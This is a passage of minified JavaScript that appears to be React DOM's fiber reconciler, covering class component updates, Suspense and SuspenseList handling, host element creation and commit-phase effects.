        typeof u == "object" && u !== null ? u = Ve(u) : (u = Te(n) ? un : xe.current, u = zn(t, u));
        var d = n.getDerivedStateFromProps,
            h = typeof d == "function" || typeof o.getSnapshotBeforeUpdate == "function";
        h || typeof o.UNSAFE_componentWillReceiveProps != "function" && typeof o.componentWillReceiveProps != "function" || (i !== r || s !== u) && ru(t, o, r, u), Tt = !1;
        var v = t.memoizedState;
        o.state = v, Yl(t, r, o, l), s = t.memoizedState, i !== r || v !== s || Pe.current || Tt ? (typeof d == "function" && (Mo(t, n, d, r), s = t.memoizedState), (i = Tt || nu(t, n, i, r, v, s, u)) ? (h || typeof o.UNSAFE_componentWillMount != "function" && typeof o.componentWillMount != "function" || (typeof o.componentWillMount == "function" && o.componentWillMount(), typeof o.UNSAFE_componentWillMount == "function" && o.UNSAFE_componentWillMount()), typeof o.componentDidMount == "function" && (t.flags |= 4194308)) : (typeof o.componentDidMount == "function" && (t.flags |= 4194308), t.memoizedProps = r, t.memoizedState = s), o.props = r, o.state = s, o.context = u, r = i) : (typeof o.componentDidMount == "function" && (t.flags |= 4194308), r = !1)
    } else {
        o = t.stateNode, Gc(e, t), i = t.memoizedProps, u = t.type === t.elementType ? i : Ze(t.type, i), o.props = u, h = t.pendingProps, v = o.context, s = n.contextType, typeof s == "object" && s !== null ? s = Ve(s) : (s = Te(n) ? un : xe.current, s = zn(t, s));
        var y = n.getDerivedStateFromProps;
        (d = typeof y == "function" || typeof o.getSnapshotBeforeUpdate == "function") || typeof o.UNSAFE_componentWillReceiveProps != "function" && typeof o.componentWillReceiveProps != "function" || (i !== h || v !== s) && ru(t, o, r, s), Tt = !1, v = t.memoizedState, o.state = v, Yl(t, r, o, l);
        var w = t.memoizedState;
        i !== h || v !== w || Pe.current || Tt ? (typeof y == "function" && (Mo(t, n, y, r), w = t.memoizedState), (u = Tt || nu(t, n, u, r, v, w, s) || !1) ? (d || typeof o.UNSAFE_componentWillUpdate != "function" && typeof o.componentWillUpdate != "function" || (typeof o.componentWillUpdate == "function" && o.componentWillUpdate(r, w, s), typeof o.UNSAFE_componentWillUpdate == "function" && o.UNSAFE_componentWillUpdate(r, w, s)), typeof o.componentDidUpdate == "function" && (t.flags |= 4), typeof o.getSnapshotBeforeUpdate == "function" && (t.flags |= 1024)) : (typeof o.componentDidUpdate != "function" || i === e.memoizedProps && v === e.memoizedState || (t.flags |= 4), typeof o.getSnapshotBeforeUpdate != "function" || i === e.memoizedProps && v === e.memoizedState || (t.flags |= 1024), t.memoizedProps = r, t.memoizedState = w), o.props = r, o.state = w, o.context = s, r = u) : (typeof o.componentDidUpdate != "function" || i === e.memoizedProps && v === e.memoizedState || (t.flags |= 4), typeof o.getSnapshotBeforeUpdate != "function" || i === e.memoizedProps && v === e.memoizedState || (t.flags |= 1024), r = !1)
    }
    return Wo(e, t, n, r, a, l)
}

function Wo(e, t, n, r, l, a) {
    Ed(e, t);
    var o = (t.flags & 128) !== 0;
    if (!r && !o) return l && Zs(t, n, !1), St(e, t, a);
    r = t.stateNode, Nm.current = t;
    var i = o && typeof n.getDerivedStateFromError != "function" ? null : r.render();
    return t.flags |= 1, e !== null && o ? (t.child = Wn(t, e.child, null, a), t.child = Wn(t, null, i, a)) : ke(e, t, i, a), t.memoizedState = r.state, l && Zs(t, n, !0), t.child
}

function Nd(e) {
    var t = e.stateNode;
    t.pendingContext ? Xs(e, t.pendingContext, t.pendingContext !== t.context) : t.context && Xs(e, t.context, !1), Fi(e, t.containerInfo)
}

function pu(e, t, n, r, l) {
    return An(), Ti(l), t.flags |= 256, ke(e, t, n, r), t.child
}
var Uo = {
    dehydrated: null,
    treeContext: null,
    retryLane: 0
};

function Bo(e) {
    return {
        baseLanes: e,
        cachePool: null,
        transitions: null
    }
}

function Cd(e, t, n) {
    var r = t.pendingProps,
        l = X.current,
        a = !1,
        o = (t.flags & 128) !== 0,
        i;
    if ((i = o) || (i = e !== null && e.memoizedState === null ? !1 : (l & 2) !== 0), i ? (a = !0, t.flags &= -129) : (e === null || e.memoizedState !== null) && (l |= 1), B(X, l & 1), e === null) return Io(t), e = t.memoizedState, e !== null && (e = e.dehydrated, e !== null) ? (t.mode & 1 ? e.data === "$!" ? t.lanes = 8 : t.lanes = 1073741824 : t.lanes = 1, null) : (o = r.children, e = r.fallback, a ? (r = t.mode, a = t.child, o = {
        mode: "hidden",
        children: o
    }, !(r & 1) && a !== null ? (a.childLanes = 0, a.pendingProps = o) : a = va(o, r, 0, null), e = sn(e, r, n, null), a.return = t, e.return = t, a.sibling = e, t.child = a, t.child.memoizedState = Bo(n), t.memoizedState = Uo, e) : Ui(t, o));
    if (l = e.memoizedState, l !== null && (i = l.dehydrated, i !== null)) return Cm(e, t, o, r, i, l, n);
    if (a) {
        a = r.fallback, o = t.mode, l = e.child, i = l.sibling;
        var s = {
            mode: "hidden",
            children: r.children
        };
        return !(o & 1) && t.child !== l ? (r = t.child, r.childLanes = 0, r.pendingProps = s, t.deletions = null) : (r = Bt(l, s), r.subtreeFlags = l.subtreeFlags & 14680064), i !== null ? a = Bt(i, a) : (a = sn(a, o, n, null), a.flags |= 2), a.return = t, r.return = t, r.sibling = a, t.child = r, r = a, a = t.child, o = e.child.memoizedState, o = o === null ? Bo(n) : {
            baseLanes: o.baseLanes | n,
            cachePool: null,
            transitions: o.transitions
        }, a.memoizedState = o, a.childLanes = e.childLanes & ~n, t.memoizedState = Uo, r
    }
    return a = e.child, e = a.sibling, r = Bt(a, {
        mode: "visible",
        children: r.children
    }), !(t.mode & 1) && (r.lanes = n), r.return = t, r.sibling = null, e !== null && (n = t.deletions, n === null ? (t.deletions = [e], t.flags |= 16) : n.push(e)), t.child = r, t.memoizedState = null, r
}

function Ui(e, t) {
    return t = va({
        mode: "visible",
        children: t
    }, e.mode, 0, null), t.return = e, e.child = t
}

function ml(e, t, n, r) {
    return r !== null && Ti(r), Wn(t, e.child, null, n), e = Ui(t, t.pendingProps.children), e.flags |= 2, t.memoizedState = null, e
}

function Cm(e, t, n, r, l, a, o) {
    if (n) return t.flags & 256 ? (t.flags &= -257, r = Ka(Error(E(422))), ml(e, t, o, r)) : t.memoizedState !== null ? (t.child = e.child, t.flags |= 128, null) : (a = r.fallback, l = t.mode, r = va({
        mode: "visible",
        children: r.children
    }, l, 0, null), a = sn(a, l, o, null), a.flags |= 2, r.return = t, a.return = t, r.sibling = a, t.child = r, t.mode & 1 && Wn(t, e.child, null, o), t.child.memoizedState = Bo(o), t.memoizedState = Uo, a);
    if (!(t.mode & 1)) return ml(e, t, o, null);
    if (l.data === "$!") {
        if (r = l.nextSibling && l.nextSibling.dataset, r) var i = r.dgst;
        return r = i, a = Error(E(419)), r = Ka(a, r, void 0), ml(e, t, o, r)
    }
    if (i = (o & e.childLanes) !== 0, Ce || i) {
        if (r = de, r !== null) {
            switch (o & -o) {
                case 4:
                    l = 2;
                    break;
                case 16:
                    l = 8;
                    break;
                case 64:
                case 128:
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                case 4194304:
                case 8388608:
                case 16777216:
                case 33554432:
                case 67108864:
                    l = 32;
                    break;
                case 536870912:
                    l = 268435456;
                    break;
                default:
                    l = 0
            }
            l = l & (r.suspendedLanes | o) ? 0 : l, l !== 0 && l !== a.retryLane && (a.retryLane = l, bt(e, l), rt(r, e, l, -1))
        }
        return Yi(), r = Ka(Error(E(421))), ml(e, t, o, r)
    }
    return l.data === "$?" ? (t.flags |= 128, t.child = e.child, t = zm.bind(null, e), l._reactRetry = t, null) : (e = a.treeContext, _e = zt(l.nextSibling), Re = t, Y = !0, qe = null, e !== null && (Ae[We++] = vt, Ae[We++] = gt, Ae[We++] = cn, vt = e.id, gt = e.overflow, cn = t), t = Ui(t, r.children), t.flags |= 4096, t)
}

function mu(e, t, n) {
    e.lanes |= t;
    var r = e.alternate;
    r !== null && (r.lanes |= t), Do(e.return, t, n)
}

function Ya(e, t, n, r, l) {
    var a = e.memoizedState;
    a === null ? e.memoizedState = {
        isBackwards: t,
        rendering: null,
        renderingStartTime: 0,
        last: r,
        tail: n,
        tailMode: l
    } : (a.isBackwards = t, a.rendering = null, a.renderingStartTime = 0, a.last = r, a.tail = n, a.tailMode = l)
}

function Pd(e, t, n) {
    var r = t.pendingProps,
        l = r.revealOrder,
        a = r.tail;
    if (ke(e, t, r.children, n), r = X.current, r & 2) r = r & 1 | 2, t.flags |= 128;
    else {
        if (e !== null && e.flags & 128) e: for (e = t.child; e !== null;) {
            if (e.tag === 13) e.memoizedState !== null && mu(e, n, t);
            else if (e.tag === 19) mu(e, n, t);
            else if (e.child !== null) {
                e.child.return = e, e = e.child;
                continue
            }
            if (e === t) break e;
            for (; e.sibling === null;) {
                if (e.return === null || e.return === t) break e;
                e = e.return
            }
            e.sibling.return = e.return, e = e.sibling
        }
        r &= 1
    }
    if (B(X, r), !(t.mode & 1)) t.memoizedState = null;
    else switch (l) {
        case "forwards":
            for (n = t.child, l = null; n !== null;) e = n.alternate, e !== null && Gl(e) === null && (l = n), n = n.sibling;
            n = l, n === null ? (l = t.child, t.child = null) : (l = n.sibling, n.sibling = null), Ya(t, !1, l, n, a);
            break;
        case "backwards":
            for (n = null, l = t.child, t.child = null; l !== null;) {
                if (e = l.alternate, e !== null && Gl(e) === null) {
                    t.child = l;
                    break
                }
                e = l.sibling, l.sibling = n, n = l, l = e
            }
            Ya(t, !0, n, null, a);
            break;
        case "together":
            Ya(t, !1, null, null, void 0);
            break;
        default:
            t.memoizedState = null
    }
    return t.child
}

function Tl(e, t) {
    !(t.mode & 1) && e !== null && (e.alternate = null, t.alternate = null, t.flags |= 2)
}

function St(e, t, n) {
    if (e !== null && (t.dependencies = e.dependencies), fn |= t.lanes, !(n & t.childLanes)) return null;
    if (e !== null && t.child !== e.child) throw Error(E(153));
    if (t.child !== null) {
        for (e = t.child, n = Bt(e, e.pendingProps), t.child = n, n.return = t; e.sibling !== null;) e = e.sibling, n = n.sibling = Bt(e, e.pendingProps), n.return = t;
        n.sibling = null
    }
    return t.child
}

function Pm(e, t, n) {
    switch (t.tag) {
        case 3:
            Nd(t), An();
            break;
        case 5:
            ed(t);
            break;
        case 1:
            Te(t.type) && Bl(t);
            break;
        case 4:
            Fi(t, t.stateNode.containerInfo);
            break;
        case 10:
            var r = t.type._context,
                l = t.memoizedProps.value;
            B(Ql, r._currentValue), r._currentValue = l;
            break;
        case 13:
            if (r = t.memoizedState, r !== null) return r.dehydrated !== null ? (B(X, X.current & 1), t.flags |= 128, null) : n & t.child.childLanes ? Cd(e, t, n) : (B(X, X.current & 1), e = St(e, t, n), e !== null ? e.sibling : null);
            B(X, X.current & 1);
            break;
        case 19:
            if (r = (n & t.childLanes) !== 0, e.flags & 128) {
                if (r) return Pd(e, t, n);
                t.flags |= 128
            }
            if (l = t.memoizedState, l !== null && (l.rendering = null, l.tail = null, l.lastEffect = null), B(X, X.current), r) break;
            return null;
        case 22:
        case 23:
            return t.lanes = 0, Sd(e, t, n)
    }
    return St(e, t, n)
}
var Td, Ho, jd, Ld;
Td = function(e, t) {
    for (var n = t.child; n !== null;) {
        if (n.tag === 5 || n.tag === 6) e.appendChild(n.stateNode);
        else if (n.tag !== 4 && n.child !== null) {
            n.child.return = n, n = n.child;
            continue
        }
        if (n === t) break;
        for (; n.sibling === null;) {
            if (n.return === null || n.return === t) return;
            n = n.return
        }
        n.sibling.return = n.return, n = n.sibling
    }
};
Ho = function() {};
jd = function(e, t, n, r) {
    var l = e.memoizedProps;
    if (l !== r) {
        e = t.stateNode, rn(ct.current);
        var a = null;
        switch (n) {
            case "input":
                l = fo(e, l), r = fo(e, r), a = [];
                break;
            case "select":
                l = J({}, l, {
                    value: void 0
                }), r = J({}, r, {
                    value: void 0
                }), a = [];
                break;
            case "textarea":
                l = ho(e, l), r = ho(e, r), a = [];
                break;
            default:
                typeof l.onClick != "function" && typeof r.onClick == "function" && (e.onclick = Wl)
        }
        go(n, r);
        var o;
        n = null;
        for (u in l)
            if (!r.hasOwnProperty(u) && l.hasOwnProperty(u) && l[u] != null)
                if (u === "style") {
                    var i = l[u];
                    for (o in i) i.hasOwnProperty(o) && (n || (n = {}), n[o] = "")
                } else u !== "dangerouslySetInnerHTML" && u !== "children" && u !== "suppressContentEditableWarning" && u !== "suppressHydrationWarning" && u !== "autoFocus" && (Nr.hasOwnProperty(u) ? a || (a = []) : (a = a || []).push(u, null));
        for (u in r) {
            var s = r[u];
            if (i = l != null ? l[u] : void 0, r.hasOwnProperty(u) && s !== i && (s != null || i != null))
                if (u === "style")
                    if (i) {
                        for (o in i) !i.hasOwnProperty(o) || s && s.hasOwnProperty(o) || (n || (n = {}), n[o] = "");
                        for (o in s) s.hasOwnProperty(o) && i[o] !== s[o] && (n || (n = {}), n[o] = s[o])
                    } else n || (a || (a = []), a.push(u, n)), n = s;
            else u === "dangerouslySetInnerHTML" ? (s = s ? s.__html : void 0, i = i ? i.__html : void 0, s != null && i !== s && (a = a || []).push(u, s)) : u === "children" ? typeof s != "string" && typeof s != "number" || (a = a || []).push(u, "" + s) : u !== "suppressContentEditableWarning" && u !== "suppressHydrationWarning" && (Nr.hasOwnProperty(u) ? (s != null && u === "onScroll" && V("scroll", e), a || i === s || (a = [])) : (a = a || []).push(u, s))
        }
        n && (a = a || []).push("style", n);
        var u = a;
        (t.updateQueue = u) && (t.flags |= 4)
    }
};
Ld = function(e, t, n, r) {
    n !== r && (t.flags |= 4)
};

function ar(e, t) {
    if (!Y) switch (e.tailMode) {
        case "hidden":
            t = e.tail;
            for (var n = null; t !== null;) t.alternate !== null && (n = t), t = t.sibling;
            n === null ? e.tail = null : n.sibling = null;
            break;
        case "collapsed":
            n = e.tail;
            for (var r = null; n !== null;) n.alternate !== null && (r = n), n = n.sibling;
            r === null ? t || e.tail === null ? e.tail = null : e.tail.sibling = null : r.sibling = null
    }
}

function ge(e) {
    var t = e.alternate !== null && e.alternate.child === e.child,
        n = 0,
        r = 0;
    if (t)
        for (var l = e.child; l !== null;) n |= l.lanes | l.childLanes, r |= l.subtreeFlags & 14680064, r |= l.flags & 14680064, l.return = e, l = l.sibling;
    else
        for (l = e.child; l !== null;) n |= l.lanes | l.childLanes, r |= l.subtreeFlags, r |= l.flags, l.return = e, l = l.sibling;
    return e.subtreeFlags |= r, e.childLanes = n, t
}

function Tm(e, t, n) {
    var r = t.pendingProps;
    switch (Pi(t), t.tag) {
        case 2:
        case 16:
        case 15:
        case 0:
        case 11:
        case 7:
        case 8:
        case 12:
        case 9:
        case 14:
            return ge(t), null;
        case 1:
            return Te(t.type) && Ul(), ge(t), null;
        case 3:
            return r = t.stateNode, Un(), Q(Pe), Q(xe), Di(), r.pendingContext && (r.context = r.pendingContext, r.pendingContext = null), (e === null || e.child === null) && (fl(t) ? t.flags |= 4 : e === null || e.memoizedState.isDehydrated && !(t.flags & 256) || (t.flags |= 1024, qe !== null && (Jo(qe), qe = null))), Ho(e, t), ge(t), null;
        case 5:
            Ii(t);
            var l = rn(Mr.current);
            if (n = t.type, e !== null && t.stateNode != null) jd(e, t, n, r, l), e.ref !== t.ref && (t.flags |= 512, t.flags |= 2097152);
            else {
                if (!r) {
                    if (t.stateNode === null) throw Error(E(166));
                    return ge(t), null
                }
                if (e = rn(ct.current), fl(t)) {
                    r = t.stateNode, n = t.type;
                    var a = t.memoizedProps;
                    switch (r[st] = t, r[Ir] = a, e = (t.mode & 1) !== 0, n) {
                        case "dialog":
                            V("cancel", r), V("close", r);
                            break;
                        case "iframe":
                        case "object":
                        case "embed":
                            V("load", r);
                            break;
                        case "video":
                        case "audio":
                            for (l = 0; l < pr.length; l++) V(pr[l], r);
                            break;
                        case "source":
                            V("error", r);
                            break;
                        case "img":
                        case "image":
                        case "link":
                            V("error", r), V("load", r);
                            break;
                        case "details":
                            V("toggle", r);
                            break;
                        case "input":
                            Ss(r, a), V("invalid", r);
                            break;
                        case "select":
                            r._wrapperState = {
                                wasMultiple: !!a.multiple
                            }, V("invalid", r);
                            break;
                        case "textarea":
                            Ns(r, a), V("invalid", r)
                    }
                    go(n, a), l = null;
                    for (var o in a)
                        if (a.hasOwnProperty(o)) {
                            var i = a[o];
                            o === "children" ? typeof i == "string" ? r.textContent !== i && (a.suppressHydrationWarning !== !0 && dl(r.textContent, i, e), l = ["children", i]) : typeof i == "number" && r.textContent !== "" + i && (a.suppressHydrationWarning !== !0 && dl(r.textContent, i, e), l = ["children", "" + i]) : Nr.hasOwnProperty(o) && i != null && o === "onScroll" && V("scroll", r)
                        }
                    switch (n) {
                        case "input":
                            rl(r), Es(r, a, !0);
                            break;
                        case "textarea":
                            rl(r), Cs(r);
                            break;
                        case "select":
                        case "option":
                            break;
                        default:
                            typeof a.onClick == "function" && (r.onclick = Wl)
                    }
                    r = l, t.updateQueue = r, r !== null && (t.flags |= 4)
                } else {
                    o = l.nodeType === 9 ? l : l.ownerDocument, e === "http://www.w3.org/1999/xhtml" && (e = rc(n)), e === "http://www.w3.org/1999/xhtml" ? n === "script" ? (e = o.createElement("div"), e.innerHTML = "<script><\/script>", e = e.removeChild(e.firstChild)) : typeof r.is == "string" ? e = o.createElement(n, {
                        is: r.is
                    }) : (e = o.createElement(n), n === "select" && (o = e, r.multiple ? o.multiple = !0 : r.size && (o.size = r.size))) : e = o.createElementNS(e, n), e[st] = t, e[Ir] = r, Td(e, t, !1, !1), t.stateNode = e;
                    e: {
                        switch (o = yo(n, r), n) {
                            case "dialog":
                                V("cancel", e), V("close", e), l = r;
                                break;
                            case "iframe":
                            case "object":
                            case "embed":
                                V("load", e), l = r;
                                break;
                            case "video":
                            case "audio":
                                for (l = 0; l < pr.length; l++) V(pr[l], e);
                                l = r;
                                break;
                            case "source":
                                V("error", e), l = r;
                                break;
                            case "img":
                            case "image":
                            case "link":
                                V("error", e), V("load", e), l = r;
                                break;
                            case "details":
                                V("toggle", e), l = r;
                                break;
                            case "input":
                                Ss(e, r), l = fo(e, r), V("invalid", e);
                                break;
                            case "option":
                                l = r;
                                break;
                            case "select":
                                e._wrapperState = {
                                    wasMultiple: !!r.multiple
                                }, l = J({}, r, {
                                    value: void 0
                                }), V("invalid", e);
                                break;
                            case "textarea":
                                Ns(e, r), l = ho(e, r), V("invalid", e);
                                break;
                            default:
                                l = r
                        }
                        go(n, l),
                        i = l;
                        for (a in i)
                            if (i.hasOwnProperty(a)) {
                                var s = i[a];
                                a === "style" ? oc(e, s) : a === "dangerouslySetInnerHTML" ? (s = s ? s.__html : void 0, s != null && lc(e, s)) : a === "children" ? typeof s == "string" ? (n !== "textarea" || s !== "") && Cr(e, s) : typeof s == "number" && Cr(e, "" + s) : a !== "suppressContentEditableWarning" && a !== "suppressHydrationWarning" && a !== "autoFocus" && (Nr.hasOwnProperty(a) ? s != null && a === "onScroll" && V("scroll", e) : s != null && fi(e, a, s, o))
                            }
                        switch (n) {
                            case "input":
                                rl(e), Es(e, r, !1);
                                break;
                            case "textarea":
                                rl(e), Cs(e);
                                break;
                            case "option":
                                r.value != null && e.setAttribute("value", "" + Vt(r.value));
                                break;
                            case "select":
                                e.multiple = !!r.multiple, a = r.value, a != null ? $n(e, !!r.multiple, a, !1) : r.defaultValue != null && $n(e, !!r.multiple, r.defaultValue, !0);
                                break;
                            default:
                                typeof l.onClick == "function" && (e.onclick = Wl)
                        }
                        switch (n) {
                            case "button":
                            case "input":
                            case "select":
                            case "textarea":
                                r = !!r.autoFocus;
                                break e;
                            case "img":
                                r = !0;
                                break e;
                            default:
                                r = !1
                        }
                    }
                    r && (t.flags |= 4)
                }
                t.ref !== null && (t.flags |= 512, t.flags |= 2097152)
            }
            return ge(t), null;
        case 6:
            if (e && t.stateNode != null) Ld(e, t, e.memoizedProps, r);
            else {
                if (typeof r != "string" && t.stateNode === null) throw Error(E(166));
                if (n = rn(Mr.current), rn(ct.current), fl(t)) {
                    if (r = t.stateNode, n = t.memoizedProps, r[st] = t, (a = r.nodeValue !== n) && (e = Re, e !== null)) switch (e.tag) {
                        case 3:
                            dl(r.nodeValue, n, (e.mode & 1) !== 0);
                            break;
                        case 5:
                            e.memoizedProps.suppressHydrationWarning !== !0 && dl(r.nodeValue, n, (e.mode & 1) !== 0)
                    }
                    a && (t.flags |= 4)
                } else r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r), r[st] = t, t.stateNode = r
            }
            return ge(t), null;
        case 13:
            if (Q(X), r = t.memoizedState, e === null || e.memoizedState !== null && e.memoizedState.dehydrated !== null) {
                if (Y && _e !== null && t.mode & 1 && !(t.flags & 128)) Kc(), An(), t.flags |= 98560, a = !1;
                else if (a = fl(t), r !== null && r.dehydrated !== null) {
                    if (e === null) {
                        if (!a) throw Error(E(318));
                        if (a = t.memoizedState, a = a !== null ? a.dehydrated : null, !a) throw Error(E(317));
                        a[st] = t
                    } else An(), !(t.flags & 128) && (t.memoizedState = null), t.flags |= 4;
                    ge(t), a = !1
                } else qe !== null && (Jo(qe), qe = null), a = !0;
                if (!a) return t.flags & 65536 ? t : null
            }
            return t.flags & 128 ? (t.lanes = n, t) : (r = r !== null, r !== (e !== null && e.memoizedState !== null) && r && (t.child.flags |= 8192, t.mode & 1 && (e === null || X.current & 1 ? se === 0 && (se = 3) : Yi())), t.updateQueue !== null && (t.flags |= 4), ge(t), null);
        case 4:
            return Un(), Ho(e, t), e === null && Rr(t.stateNode.containerInfo), ge(t), null;
        case 10:
            return $i(t.type._context), ge(t), null;
        case 17:
            return Te(t.type) && Ul(), ge(t), null;
        case 19:
            if (Q(X), a = t.memoizedState, a === null) return ge(t), null;
            if (r = (t.flags & 128) !== 0, o = a.rendering, o === null)
                if (r) ar(a, !1);
                else {
                    if (se !== 0 || e !== null && e.flags & 128)
                        for (e = t.child; e !== null;) {
                            if (o = Gl(e), o !== null) {
                                for (t.flags |= 128, ar(a, !1), r = o.updateQueue, r !== null && (t.updateQueue = r, t.flags |= 4), t.subtreeFlags = 0, r = n, n = t.child; n !== null;) a = n, e = r, a.flags &= 14680066, o = a.alternate, o === null ? (a.childLanes = 0, a.lanes = e, a.child = null, a.subtreeFlags = 0, a.memoizedProps = null, a.memoizedState = null, a.updateQueue = null, a.dependencies = null, a.stateNode = null) : (a.childLanes = o.childLanes, a.lanes = o.lanes, a.child = o.child, a.subtreeFlags = 0, a.deletions = null, a.memoizedProps = o.memoizedProps, a.memoizedState = o.memoizedState, a.updateQueue = o.updateQueue, a.type = o.type, e = o.dependencies, a.dependencies = e === null ? null : {
                                    lanes: e.lanes,
                                    firstContext: e.firstContext
                                }), n = n.sibling;
                                return B(X, X.current & 1 | 2), t.child
                            }
                            e = e.sibling
                        }
                    a.tail !== null && ne() > Hn && (t.flags |= 128, r = !0, ar(a, !1), t.lanes = 4194304)
                }
            else {
                if (!r)
                    if (e = Gl(o), e !== null) {
                        if (t.flags |= 128, r = !0, n = e.updateQueue, n !== null && (t.updateQueue = n, t.flags |= 4), ar(a, !0), a.tail === null && a.tailMode === "hidden" && !o.alternate && !Y) return ge(t), null
                    } else 2 * ne() - a.renderingStartTime > Hn && n !== 1073741824 && (t.flags |= 128, r = !0, ar(a, !1), t.lanes = 4194304);
                a.isBackwards ? (o.sibling = t.child, t.child = o) : (n = a.last, n !== null ? n.sibling = o : t.child = o, a.last = o)
            }
            return a.tail !== null ? (t = a.tail, a.rendering = t, a.tail = t.sibling, a.renderingStartTime = ne(), t.sibling = null, n = X.current, B(X, r ? n & 1 | 2 : n & 1), t) : (ge(t), null);
        case 22:
        case 23:
            return Ki(), r = t.memoizedState !== null, e !== null && e.memoizedState !== null !== r && (t.flags |= 8192), r && t.mode & 1 ? $e & 1073741824 && (ge(t), t.subtreeFlags & 6 && (t.flags |= 8192)) : ge(t), null;
        case 24:
            return null;
        case 25:
            return null
    }
    throw Error(E(156, t.tag))
}

function jm(e, t) {
    switch (Pi(t), t.tag) {
        case 1:
            return Te(t.type) && Ul(), e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
        case 3:
            return Un(), Q(Pe), Q(xe), Di(), e = t.flags, e & 65536 && !(e & 128) ? (t.flags = e & -65537 | 128, t) : null;
        case 5:
            return Ii(t), null;
        case 13:
            if (Q(X), e = t.memoizedState, e !== null && e.dehydrated !== null) {
                if (t.alternate === null) throw Error(E(340));
                An()
            }
            return e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
        case 19:
            return Q(X), null;
        case 4:
            return Un(), null;
        case 10:
            return $i(t.type._context), null;
        case 22:
        case 23:
            return Ki(), null;
        case 24:
            return null;
        default:
            return null
    }
}
var hl = !1,
    ye = !1,
    Lm = typeof WeakSet == "function" ? WeakSet : Set,
    L = null;

function Tn(e, t) {
    var n = e.ref;
    if (n !== null)
        if (typeof n == "function") try {
            n(null)
        } catch (r) {
            ee(e, t, r)
        } else n.current = null
}

function Vo(e, t, n) {
    try {
        n()
    } catch (r) {
        ee(e, t, r)
    }
}
var hu = !1;

function $m(e, t) {
    if (To = Ol, e = Fc(), Ni(e)) {
        if ("selectionStart" in e) var n = {
            start: e.selectionStart,
            end: e.selectionEnd
        };
        else e: {
            n = (n = e.ownerDocument) && n.defaultView || window;
            var r = n.getSelection && n.getSelection();
            if (r && r.rangeCount !== 0) {
                n = r.anchorNode;
                var l = r.anchorOffset,
                    a = r.focusNode;
                r = r.focusOffset;
                try {
                    n.nodeType, a.nodeType
                } catch {
                    n = null;
                    break e
                }
                var o = 0,
                    i = -1,
                    s = -1,
                    u = 0,
                    d = 0,
                    h = e,
                    v = null;
                t: for (;;) {
                    for (var y; h !== n || l !== 0 && h.nodeType !== 3 || (i = o + l), h !== a || r !== 0 && h.nodeType !== 3 || (s = o + r), h.nodeType === 3 && (o += h.nodeValue.length), (y = h.firstChild) !== null;) v = h, h = y;
                    for (;;) {
                        if (h === e) break t;
                        if (v === n && ++u === l && (i = o), v === a && ++d === r && (s = o), (y = h.nextSibling) !== null) break;
                        h = v, v = h.parentNode
                    }
                    h = y
                }
                n = i === -1 || s === -1 ? null : {
                    start: i,
                    end: s
                }
            } else n = null
        }
        n = n || {
            start: 0,
            end: 0
        }
    } else n = null;
    for (jo = {
            focusedElem: e,
            selectionRange: n
        }, Ol = !1, L = t; L !== null;)
        if (t = L, e = t.child, (t.subtreeFlags & 1028) !== 0 && e !== null) e.return = t, L = e;
        else
            for (; L !== null;) {
                t = L;
                try {
                    var w = t.alternate;
                    if (t.flags & 1024) switch (t.tag) {
                        case 0:
                        case 11:
                        case 15:
                            break;
                        case 1:
                            if (w !== null) {
                                var x = w.memoizedProps,
                                    b = w.memoizedState,
                                    f = t.stateNode,
                                    c = f.getSnapshotBeforeUpdate(t.elementType === t.type ? x : Ze(t.type, x), b);
                                f.__reactInternalSnapshotBeforeUpdate = c
                            }
                            break;
                        case 3:
                            var m = t.stateNode.containerInfo;
                            m.nodeType === 1 ? m.textContent = "" : m.nodeType === 9 && m.documentElement && m.removeChild(m.documentElement);
                            break;
                        case 5:
                        case 6:
                        case 4:
                        case 17:
                            break;
                        default:
                            throw Error(E(163))
                    }
                } catch (k) {
                    ee(t, t.return, k)
                }
                if (e = t.sibling, e !== null) {
                    e.return = t.return, L = e;
                    break
                }
                L = t.return
            }
    return w = hu, hu = !1, w
}

function kr(e, t, n) {
    var r = t.updateQueue;
    if (r = r !== null ? r.lastEffect : null, r !== null) {
        var l = r = r.next;
        do {
            if ((l.tag & e) === e) {
                var a = l.destroy;
                l.destroy = void 0, a !== void 0 && Vo(t, n, a)
            }
            l = l.next
        } while (l !== r)
    }
}

function ma(e, t) {
    if (t = t.updateQueue, t = t !== null ? t.lastEffect : null, t !== null) {
        var n = t = t.next;
        do {
            if ((n.tag & e) === e) {
                var r = n.create;
                n.destroy = r()
            }
            n = n.next
        } while (n !== t)
    }
}

function Qo(e) {
    var t = e.ref;
    if (t !== null) {
        var n = e.stateNode;
        switch (e.tag) {
            case 5:
                e = n;
                break;
            default:
                e = n
        }
        typeof t == "function" ? t(e) : t.current = e
    }
}

function $d(e) {
    var t = e.alternate;
    t !== null && (e.alternate = null, $d(t)), e.child = null, e.deletions = null, e.sibling = null, e.tag === 5 && (t = e.stateNode, t !== null && (delete t[st], delete t[Ir], delete t[_o], delete t[pm], delete t[mm])), e.stateNode = null, e.return = null, e.dependencies = null, e.memoizedProps = null, e.memoizedState = null, e.pendingProps = null, e.stateNode = null, e.updateQueue = null
}

function _d(e) {
    return e.tag === 5 || e.tag === 3 || e.tag === 4
}

function vu(e) {
    e: for (;;) {
        for (; e.sibling === null;) {
            if (e.return === null || _d(e.return)) return null;
            e = e.return
        }
        for (e.sibling.return = e.return, e = e.sibling; e.tag !== 5 && e.tag !== 6 && e.tag !== 18;) {
            if (e.flags & 2 || e.child === null || e.tag === 4) continue e;
            e.child.return = e, e = e.child
        }
        if (!(e.flags & 2)) return e.stateNode
    }
}

function Ko(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6) e = e.stateNode, t ? n.nodeType === 8 ? n.parentNode.insertBefore(e, t) : n.insertBefore(e, t) : (n.nodeType === 8 ? (t = n.parentNode, t.insertBefore(e, n)) : (t = n, t.appendChild(e)), n = n._reactRootContainer, n != null || t.onclick !== null || (t.onclick = Wl));
    else if (r !== 4 && (e = e.child, e !== null))
        for (Ko(e, t, n), e = e.sibling; e !== null;) Ko(e, t, n), e = e.sibling
}

function Yo(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6) e = e.stateNode, t ? n.insertBefore(e, t) : n.appendChild(e);
    else if (r !== 4 && (e = e.child, e !== null))
        for (Yo(e, t, n), e = e.sibling; e !== null;) Yo(e, t, n), e = e.sibling
}
